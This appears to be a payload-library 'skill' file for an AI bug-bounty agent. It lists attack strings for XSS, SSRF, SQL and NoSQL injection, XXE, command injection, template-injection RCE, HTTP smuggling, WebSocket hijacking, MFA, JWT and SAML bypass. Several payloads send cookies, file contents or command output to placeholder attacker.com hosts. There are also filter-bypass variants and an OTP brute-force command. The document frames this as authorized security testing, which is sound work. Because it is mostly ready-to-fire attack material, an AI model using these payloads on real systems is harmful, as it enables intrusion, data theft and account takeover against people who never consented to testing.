---
name: security-arsenal
description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, or bypass techniques. Submittability and the always-rejected / what-NOT-to-submit decision are owned by triage-validation.
---

# SECURITY ARSENAL

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (proof of impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML reflection
// Vue v-html binding

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS Sources and Sinks
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE)
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### Union-Based (determine column count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Blind SQLi (time-based confirmation)
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP (DNS confirmation)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### XXE via DOCX/SVG/PDF Upload
- SVG: `<image href="file:///etc/passwd" />`
- DOCX: malicious XML in `word/document.xml` with external entity

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## AUTHENTICATION BYPASS PAYLOADS

### JWT Attacks
```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth Attacks
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection (JSON body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET Parameter Injection
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB (out-of-band confirmation)
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
# Obfuscate with quotes
;c'a't /etc/passwd
;c"a"t /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### Context-Specific (filename injection)
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---

## SSTI DETECTION PAYLOADS (All Engines)

### Universal Probe (send all, observe which evaluate)
```
{{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}         → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}         → 49 = Mako (Python) or Pebble (Java)
*{7*7}         → 49 = Spring Thymeleaf
{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
```

### RCE Payloads by Engine

**Jinja2 (Python/Flask/Django):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB (Ruby on Rails):**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS (Node.js):**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

### Where to Test
```
Name/bio/username fields, email subject templates, invoice/PDF generators,
URL path parameters reflected in page, error messages, search query reflections,
HTTP headers that appear in rendered responses, notification templates
```

---

## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### Impact Chain
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### Injection via WS Messages
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
```

---

## MFA / 2FA BYPASS PAYLOADS

### Pattern 1: OTP Brute Force (no rate limit)
```bash
# Try all 6-digit OTPs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Rate limit bypass: rotate session tokens between requests
# Or use GraphQL batching to send 100 attempts per request
```

### Pattern 2: OTP Reuse (token not invalidated)
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out
4. Log in again
5. Submit same OTP "123456" (expired? still works?)
6. Try OTP from previous session at new login
```

### Pattern 3: Response Manipulation
```
Step 1: Enter wrong OTP → intercept response in Burp
Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
Step 3: Forward modified response → sometimes app trusts it and proceeds
Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
```

### Pattern 4: Code Predictability
```python
import requests, time

# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = generate_totp(secret, time.time() + t_offset)
    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
    if r.status_code == 200:
        print(f"VALID at offset {t_offset}s: {totp_value}")
        break
```

### Pattern 5: Backup Codes Not Rate Limited
```bash
# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
# Try brute force on /api/verify-backup-code if no rate limit
```

### Pattern 6: Skip MFA Step (Workflow Bypass)
```bash
# After entering username/password, you get a session cookie
# Test: skip the /mfa/verify step entirely, go directly to /dashboard
# If cookie grants access before MFA = auth flow bypass

# Also: complete MFA in one session, reuse cookie in another browser
# Checks whether MFA completion is tied to the specific session
```

### Pattern 7: Race on MFA Verification
```python
import asyncio, aiohttp

# Race 2 MFA verifications simultaneously
# If both succeed = parallel session ATO
async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return await r.json()

async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)

asyncio.run(race())
```

---

## SAML ATTACKS

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- Original valid assertion: -->
<saml:Assertion ID="legit">
  <NameID>user@company.com</NameID>
  <ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>
</saml:Assertion>

<!-- XSW: Inject malicious assertion before/after the signed one. -->
<!-- Server validates signature on #legit but processes #evil instead. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>     <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">              <!-- Original stays valid -->
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Original: user@company.com -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: admin@company.com -->
<!-- SAML validator sees "user@company.com" (before comment) -->
<!-- Application uses "admin@company.com" (after comment stripped) -->
```

### Attack 3: Signature Stripping
```
1. Capture SAMLResponse (base64 decode from browser)
2. Remove or modify the <Signature> element entirely
3. Change NameID to admin@company.com
4. Re-encode and submit
5. If server doesn't validate signature presence = admin login
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response>
  <saml:Assertion>
    <NameID>&xxe;</NameID>
  </saml:Assertion>
</saml:Response>
```

### Tools
```bash
# SAMLRaider (Burp extension) — most automated XSW testing
# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider

# Manual: decode, modify, re-encode
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
# Edit saml.xml
cat saml.xml | base64 -w0  # Re-encode
```

---

## GF PATTERN NAMES (tomnomnom/gf)

```bash
# Install: https://github.com/tomnomnom/gf
# Usage: cat urls.txt | gf PATTERN

gf xss          # XSS parameters
gf ssrf         # SSRF parameters
gf idor         # IDOR parameters
gf sqli         # SQL injection parameters
gf redirect     # Open redirect parameters
gf lfi          # Local file inclusion
gf rce          # Remote code execution parameters
gf ssti         # Template injection parameters
gf debug_logic  # Debug/logic parameters
gf secrets      # Secret/token patterns
gf upload-fields # File upload parameters
gf cors         # CORS-related parameters
```

---

## ALWAYS REJECTED — NEVER SUBMIT

Submitting these destroys your validity ratio. N/A hurts. Don't.

```
Missing CSP / HSTS / X-Frame-Options / other security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone (no auth bypass, no IDOR)
Banner / version disclosure without a working CVE exploit
Clickjacking on non-sensitive pages (no sensitive action in PoC)
Tabnabbing
CSV injection (no actual code execution shown)
CORS wildcard (*) without credential exfil PoC
Logout CSRF
Self-XSS (only exploits own account)
Open redirect alone (no ATO chain, no OAuth code theft)
OAuth client_secret in mobile app (disclosed, expected)
SSRF with DNS callback only (no internal service access)
Host header injection alone (no password reset poisoning PoC)
Rate limit on non-critical forms (login page Cloudflare, search, contact)
Session not invalidated on logout
Concurrent sessions allowed
Internal IP address in error message
Mixed content (HTTP resources on HTTPS page)
SSL weak cipher suites
Missing HttpOnly / Secure cookie flags alone
Broken external links
Pre-account takeover (usually — requires very specific conditions)
Autocomplete on password fields
```

---

## CONDITIONALLY VALID — REQUIRES CHAIN

These are valid ONLY when combined with a chain that proves real impact:

| Standalone Finding | Chain Required | Result if Chained |
|---|---|---|
| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
| Clickjacking | + sensitive action + working PoC (not just login) | Medium |
| CORS wildcard | + credentialed request exfils user data | High |
| CSRF | + sensitive action (transfer funds, change email) | High |
| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
| SSRF DNS-only | + internal service access + data retrieval | Medium |
| Host header injection | + password reset email uses it | High |
| Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
| S3 bucket listing | + JS bundles with API keys/OAuth secrets | Medium/High |
| Self-XSS | + CSRF to trigger it on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
| GraphQL introspection | + auth bypass mutation or IDOR on node() | High |

**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say "could chain with B" — prove it.

---

## WORDLISTS (Installed in ~/wordlists/)

```
common.txt         # Common directories and files
params.txt         # Parameter names (id, user_id, file, etc.)
api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
dirs.txt           # Directory names
sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```

### Built-in Paths Worth Fuzzing

```bash
# Sensitive files
/.env
/.git/config
/config.json
/credentials.json
/backup.sql
/dump.sql
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt

# Admin panels
/admin
/admin/login
/administrator
/wp-admin
/manager
/console
/dashboard
/panel

# API discovery
/api
/api/v1
/api/v2
/graphql
/graphiql
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1
/v2
```

---

## Related Skills & Chains

- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** — When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.
- **`triage-validation`** — When deciding if a finding is reportable at all. Workflow primitive: the "Always Rejected" and "Conditionally Valid — Requires Chain" tables in both skills must agree; `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used by Q7.
- **`web2-recon`** — When the URL set has been classified by `gf` patterns. Workflow primitive: `gf xss/ssrf/sqli` outputs from recon → look up the corresponding payload section here; `gf` pattern names index directly into this skill's payload sections.
- **`evidence-hygiene`** — When a payload produces output worth screenshotting. Workflow primitive: after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for redaction before the screenshot becomes evidence.
- **`bb-methodology`** — When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase 3's decision flow ("ID param → IDOR checklist", "URL input → SSRF checklist") names which section of this arsenal to load.

---

## Operator Notes (Claude-BugHunter)

> Engagement-derived + 2026-specific additions to the vendored foundation.
> Wisdom from real authorized engagements + Phase 2 verification across
> this repo's 31+ skill-area live tests. The upstream payload library
> covers the WHAT; this layer covers the WHEN-IT-WORKS-vs-WHEN-IT-DOESN'T.

### Payload freshness — what's gone stale by 2026

The classic CL.TE / TE.CL HTTP smuggling payloads no longer work against Nginx ≥ 1.21, Caddy 2.x, Envoy ≥ 1.20 (verified in Phase 2H). They DO still work against HAProxy ≤ 2.4, older F5 BIG-IP, Citrix ADC, AWS ALB-specific configs, and Apache Traffic Server. Fingerprint the front-end first — `curl -sI` → `Server:` header + `Via:` chain + TLS JA3 — before burning hours on payloads that the parser already rejects at the front door.

Same story for XXE classic — Python lxml ≥ 5.x silently drops SYSTEM entities by default (Phase 2G finding). The payloads remain valid against: Java SAX, PHP DOMDocument with LIBXML_NOENT, .NET XmlDocument with XmlResolver still wired, older lxml (< 5.0), Ruby Nokogiri with DTDLOAD, and a long tail of embedded XML processors (SOAP libraries, SAML implementations, Office document parsers). The payload library still ships these — the operator decision is whether the target's parser is in the still-vulnerable set.

Other stale-by-default-but-not-everywhere payloads as of 2026: `javascript:` URLs in `<a href>` (Chrome blocks unless explicit user gesture; works in embedded WebViews, Electron, older Edge); `data:text/html` for top-level navigation (modern browsers strip in nav contexts); CRLF injection in `Location:` (most reverse proxies normalize). Always test in the actual target environment, not in a generic browser.

### WAF evaluation order matters

When multiple bypass payloads exist for the same WAF, the order to try is:

1. **Encoding tricks** — case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.
2. **Parser quirks** — XML namespace, JSON `\u` escapes mid-keyword, `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion, multipart boundary tricks.
3. **Protocol-level** — HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection, `X-Original-URL`, `X-Forwarded-*` smuggling.
4. **WAF rule-specific bypasses** — Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known signature gaps; load the vendor-specific payload subsection.

Most engagements end at step 2 — modern WAFs trip on the parser-quirk class because the WAF and the origin app disagree on what's a "valid" request.

### OOB-Or-It-Didn't-Happen Gate applies everywhere

Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab proved the gate kills FPs that look identical to real bugs at the surface — error messages with `you have an error in your SQL syntax` text in a 500 page can be parser logs from a different request entirely, hit a Burp Collaborator domain (or interactsh) and confirm callback before filing.

OOB callback infrastructure ranking by 2026: (1) Burp Collaborator (Pro license; cleanest), (2) interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party — never use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for long-running engagements).

### Marker discipline

Generic words appear naturally in target content. A search for `javascript` hitting "JavaScript Tutorial" is not reflection — it's keyword overlap. Use unique random strings:

```
m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
# now m is like "K7gXq2pNRm1z" — search for THIS in the response
curl "https://target/search?q=${m}" | grep -c "$m"
```

If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth — generic keywords lie.

### Statistical Sampling for noisy oracles

Single-trial timing differentials are noise. Require n≥10 interleaved trials, Welch's t-statistic > 3, or equivalent confidence-interval separation. Phase 2D verified this against a deliberately-noisy timing oracle: single trial showed 129ms delta (which would have been filed); n=10 showed mean 78ms vs 191ms with t=5.26 (real, well-supported).

Skeleton for timing-side-channel validation:

```python
import statistics
def welch_t(a, b):
    ma, mb = statistics.mean(a), statistics.mean(b)
    va, vb = statistics.variance(a), statistics.variance(b)
    return (ma - mb) / ((va/len(a) + vb/len(b)) ** 0.5)
# interleave control + test trials, n=10 each, t > 3 = signal
```

Same rule applies to blind boolean oracles where the diff is response-length or status-code under jitter — sample, don't assume.
